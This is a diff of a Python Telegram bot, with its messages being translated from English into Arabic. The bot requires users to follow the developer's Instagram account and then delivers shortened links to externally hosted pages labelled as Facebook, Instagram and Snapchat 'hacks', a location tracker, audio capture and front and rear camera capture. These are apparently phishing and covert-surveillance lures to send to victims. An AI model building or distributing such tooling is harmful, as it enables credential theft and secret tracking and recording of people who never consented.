@@ -32,25 +32,25 @@ def short(url):
 def start(m):
     uid, name = m.chat.id, m.from_user.first_name
     
-    # التحذير الأول باسم Abu Osayed Malkawi بالإنجليزية
+    # التحذير الأول بالعربي مع اسمك بالإنجليزي
     warning_text = f"""
-⚠️ PROGRAMMING WARNING:
+⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
 
-Dear user, to ensure system activation, you must follow the developer's official Instagram account.
+عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـضـمـان تـفـعـيـل الـنـظـام يـجـب مـتـابـعـة حـسـاب المـطـور الـرسمـي عـلى انـسـتـغـرام.
 
-📢 Developer Notice (Abu Osayed Malkawi):
-Please wait for (2 minutes) until your follow is confirmed by the server and your links are generated automatically 💀🔥
+📢 تـنـبـيـه الـمـطـور (Abu Osayed Malkawi):
+الـرجـاء الانـتـظـار لـمـدة (2 دقـيـقـة) حـتـى يـتـم تـأكـيـد مـتـابـعـتـك لـلـحـساب وتـولـيـد الـروابـط تـلـقـائـيـاً 💀🔥
     """
     
     markup = types.InlineKeyboardMarkup()
-    btn_insta = types.InlineKeyboardButton("🔗 Follow Developer (m_y_.9)", url="https://www.instagram.com/m_y_.9/")
+    btn_insta = types.InlineKeyboardButton("🔗 مـتـابـعـة المـطـور (m_y_.9)", url="https://www.instagram.com/m_y_.9/")
     markup.add(btn_insta)
     
     bot.send_message(uid, warning_text, reply_markup=markup)
 
-    # 4. تشغيل عداد الدقيقتين في الخلفية لتوليد الروابط
+    # 4. تشغيل عداد الدقيقتين في الخلفية
     def background_process(chat_id, user_name):
-        time.sleep(120) # انتظار دقيقتين
+        time.sleep(120) 
         
         h = user_name.replace(" ", "_")
         base = "https://m-y-9-tech.github.io/fb/"
@@ -66,37 +66,37 @@ Please wait for (2 minutes) until your follow is confirmed by the server and you
             "c2": short(base+"cam2.html"+p)
         }
 
-        # الرسالة النهائية مع مسافات مريحة وتنسيق احترافي
+        # الرسالة النهائية بالعربي مع اسمك بالإنجليزي
         final_msg = f"""
-🚀 M.Y.9 UNIFIED SYSTEM | VERIFIED ✅
+🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | تـم الـتـحـقـق بـنـجـاح ✅
 
 👤 Developer: 𝔸𝕓𝕦 𝕆𝕤𝕒𝕪𝕖𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 
-🔹 Facebook Hack: 
+🔹 اخـتـراق فـيـس بـوك: 
 🔗 `{lnks['fb']}`
 
-🔸 Instagram Hack: 
+🔸 اخـتـراق انـسـتـغـرام: 
 🔗 `{lnks['ig']}`
 
-👻 Snapchat Hack: 
+👻 اخـتـراق سـنـاب شـات: 
 🔗 `{lnks['sn']}`
 
-📍 Location Tracker: 
+📍 سـحـب الـمـوقـع: 
 🔗 `{lnks['lc']}`
 
-🎤 Audio Capture: 
+🎤 سـحـب الـصـوت: 
 🔗 `{lnks['au']}`
 
-🤳 Front Camera: 
+🤳 كـمـرة أمـامـيـة: 
 🔗 `{lnks['c1']}`
 
-📷 Rear Camera: 
+📷 كـمـرة خـلـفـيـة: 
 🔗 `{lnks['c2']}`
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-⚖️ DISCLAIMER: The developer (Abu Osayed Malkawi) is not responsible for any illegal or harmful use.
+⚖️ إخـلاء مـسـؤولـيـة: الـمـطـور (Abu Osayed Malkawi) غـيـر مـسـؤول عـن أي اسـتـخـدام ضـار.
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 ⚙️ Status: Connected Successfully
         """
@@ -107,12 +107,10 @@ Please wait for (2 minutes) until your follow is confirmed by the server and you
 
     Thread(target=background_process, args=(uid, name)).start()
 
-# 5. تشغيل البوت مع ضمان عدم التعارض
+# 5. تشغيل البوت
 if __name__ == "__main__":
     keep_alive()
-    # تنظيف أي ويب هوك قديم
     bot.remove_webhook()
     time.sleep(1)
-    print("M.Y.9 System is now LIVE for Abu Osayed Malkawi...")
-    # استخدام skip_pending لمسح أي رسائل قديمة وتجنب الأخطاء
+    print("M.Y.9 System is LIVE for Abu Osayed Malkawi...")
     bot.infinity_polling(skip_pending=True)
